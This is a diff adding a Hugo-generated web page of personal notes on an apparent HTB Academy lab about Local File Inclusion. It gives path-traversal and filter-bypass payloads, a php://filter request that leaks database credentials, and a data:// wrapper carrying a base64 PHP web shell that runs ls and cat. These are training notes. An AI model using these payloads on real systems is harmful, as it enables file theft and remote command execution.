@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=36271&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="File Inclusion: For the first information, use the following payload: ../../../../etc/passwd This will reveal ballen as a username. The first flag is located at: ../../../../usr/share/flags/flag.txt Basic Bypass: Use the following payload for a basic bypass: ....//....//....//....//flag.txt PHP Filter: Run feroxbuster to find files on the server: feroxbuster -u http://83.136.254.158:57904 -w /root/SecLists/Discovery/Web-Content/common.txt -x .php You will find a file named configure.php. Access it with a PHP filter payload: http://83.136.254.158:57904/index.php?language=php://filter/read=convert.base64-encode/resource=configure This will return a Base64-encoded file.">
+<title>LFI (Local File Inclusion) Exploitation</title>
+
+<link rel='canonical' href='http://localhost:36271/posts/web-security/lfi-htb-academy-md/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="LFI (Local File Inclusion) Exploitation">
+<meta property='og:description' content="File Inclusion: For the first information, use the following payload: ../../../../etc/passwd This will reveal ballen as a username. The first flag is located at: ../../../../usr/share/flags/flag.txt Basic Bypass: Use the following payload for a basic bypass: ....//....//....//....//flag.txt PHP Filter: Run feroxbuster to find files on the server: feroxbuster -u http://83.136.254.158:57904 -w /root/SecLists/Discovery/Web-Content/common.txt -x .php You will find a file named configure.php. Access it with a PHP filter payload: http://83.136.254.158:57904/index.php?language=php://filter/read=convert.base64-encode/resource=configure This will return a Base64-encoded file.">
+<meta property='og:url' content='http://localhost:36271/posts/web-security/lfi-htb-academy-md/'>
+<meta property='og:site_name' content='Istark Cybersecurity Notes'>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='Cybersecurity' /><meta property='article:tag' content='Notes' /><meta property='article:published_time' content='2025-04-04T15:21:31&#43;02:00'/><meta property='article:modified_time' content='2025-04-04T15:21:31&#43;02:00'/>
+<meta name="twitter:title" content="LFI (Local File Inclusion) Exploitation">
+<meta name="twitter:description" content="File Inclusion: For the first information, use the following payload: ../../../../etc/passwd This will reveal ballen as a username. The first flag is located at: ../../../../usr/share/flags/flag.txt Basic Bypass: Use the following payload for a basic bypass: ....//....//....//....//flag.txt PHP Filter: Run feroxbuster to find files on the server: feroxbuster -u http://83.136.254.158:57904 -w /root/SecLists/Discovery/Web-Content/common.txt -x .php You will find a file named configure.php. Access it with a PHP filter payload: http://83.136.254.158:57904/index.php?language=php://filter/read=convert.base64-encode/resource=configure This will return a Base64-encoded file.">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔒</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Istark Cybersecurity Notes</a></h1>
+            <h2 class="site-description">Cybersecurity and ethical hacking notes</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about' >
+                
+                
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/posts' >
+                
+                
+                
+                <span>Notes</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/categories' >
+                
+                
+                
+                <span>Categories</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tags' >
+                
+                
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web-security/" >
+                Web Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/web-security/lfi-htb-academy-md/">LFI (Local File Inclusion) Exploitation</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 4, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    1 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="file-inclusion">File Inclusion:
+</h2><ul>
+<li>
+<p>For the first information, use the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>../../../../etc/passwd
+</span></span></code></pre></div></li>
+<li>
+<p>This will reveal <strong>ballen</strong> as a username.</p>
+</li>
+<li>
+<p>The first flag is located at:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>../../../../usr/share/flags/flag.txt
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="basic-bypass">Basic Bypass:
+</h2><ul>
+<li>
+<p>Use the following payload for a basic bypass:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>....//....//....//....//flag.txt
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="php-filter">PHP Filter:
+</h2><ol>
+<li>
+<p>Run <strong>feroxbuster</strong> to find files on the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -u http://83.136.254.158:57904 -w /root/SecLists/Discovery/Web-Content/common.txt -x .php
+</span></span></code></pre></div></li>
+<li>
+<p>You will find a file named <code>configure.php</code>. Access it with a PHP filter payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://83.136.254.158:57904/index.php?language<span style="color:#f92672">=</span>php://filter/read<span style="color:#f92672">=</span>convert.base64-encode/resource<span style="color:#f92672">=</span>configure
+</span></span></code></pre></div></li>
+<li>
+<p>This will return a Base64-encoded file. After decoding it, you&rsquo;ll see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">realpath</span>(<span style="color:#66d9ef">__FILE__</span>) <span style="color:#f92672">==</span> <span style="color:#a6e22e">realpath</span>($_SERVER[<span style="color:#e6db74">&#39;SCRIPT_FILENAME&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>, <span style="color:#66d9ef">TRUE</span>, <span style="color:#ae81ff">403</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;location: /index.php&#39;</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$config <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;DB_HOST&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;db.inlanefreight.local&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;DB_USERNAME&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;root&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;DB_DATABASE&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div></li>
+</ol>
+<h2 id="php-wrappers">PHP Wrappers:
+</h2><ol>
+<li>
+<p>Use <strong>curl</strong> to access sensitive files using PHP wrappers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://94.237.57.90:46790/index.php?language<span style="color:#f92672">=</span>php://filter/read<span style="color:#f92672">=</span>convert.base64-encode/resource<span style="color:#f92672">=</span>../../../../etc/php/7.4/apache2/php.ini
+</span></span></code></pre></div></li>
+<li>
+<p>To list files on the machine, use the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://94.237.54.201:36693/index.php?language<span style="color:#f92672">=</span>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd<span style="color:#f92672">=</span>ls%20/
+</span></span></code></pre></div></li>
+<li>
+<p>After locating the <code>.txt</code> file, use <code>cat</code> to read its contents:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://94.237.54.201:36693/index.php?language<span style="color:#f92672">=</span>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd<span style="color:#f92672">=</span>cat%20/37809e2f8952f06139011994726d9ef1.txt
+</span></span></code></pre></div></li>
+</ol>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/cybersecurity/">Cybersecurity</a>
+        
+            <a href="/tags/notes/">Notes</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/low-level/architecture-informatique-de-bas-niveau-et-s%C3%A9curit%C3%A9-le-kernel-et-le-d%C3%A9veloppement-de-logiciels-malveillants-md/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Low-Level Computer Architecture and Security</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/low-level/cours-sur-la-gestion-de-la-m%C3%A9moire-brk-mmap-et-structure-de-la-m%C3%A9moire-md/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Memory Management: brk, mmap and Memory Structure</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/web-security/web-fuzzing-htb-course-notes-md/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web Fuzzing Techniques</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/posts/low-level/x86-64-nasm-assembly-language-registers-calling-conventions-and-examples-md/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">x86-64 Assembly: Registers, Calling Conventions and Examples</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Istark Cybersecurity Notes
+    </section>
+    
+    <section class="powerby">
+        
+            Istark Cybersecurity <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.93f3701fefeecbcd5accabe4dc68be99acd604243788fcbf328900fb0eaaa5b5.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
